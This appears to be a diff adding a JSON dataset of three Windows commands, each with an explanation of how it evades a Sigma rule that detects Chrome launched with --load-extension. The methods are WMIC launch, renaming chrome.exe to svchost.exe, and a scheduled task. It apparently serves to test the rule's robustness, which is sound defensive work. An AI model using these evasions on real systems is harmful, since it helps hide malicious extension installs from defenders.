@@ -1,0 +1,14 @@
+[
+  {
+    "output": "wmic process call create \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --load-extension=C:\\Temp\\CustomExtension\"",
+    "explanation": "When launching the browser via Windows Management Instrumentation Command-line (WMIC), the actual parent process of chrome.exe becomes WmiPrvSE.exe. This completely bypasses the Sigma rule because WmiPrvSE.exe is not included in the hardcoded ParentImage list (cmd.exe, powershell.exe, etc.)."
+  },
+  {
+    "output": "cmd.exe /c copy \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" %TEMP%\\svchost.exe && %TEMP%\\svchost.exe --load-extension=C:\\Temp\\CustomExtension",
+    "explanation": "This command copies the legitimate chrome.exe binary to a temporary folder with a new name before execution. Even though the parent process is cmd.exe (which matches the rule), the Image field in the event log will end with '\\svchost.exe'. This bypasses the rule's Image|endswith condition, which strictly monitors specific names like '\\chrome.exe' or '\\msedge.exe'."
+  },
+  {
+    "output": "schtasks /create /tn \"BrowserUpdate\" /tr \"'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe' --load-extension=C:\\Temp\\CustomExtension\" /sc once /st 00:00 /run",
+    "explanation": "By creating and executing a scheduled task, the browser is spawned by the Task Scheduler service (svchost.exe). Since svchost.exe is not present in the ParentImage list, the detection logic fails to trigger."
+  }
+]
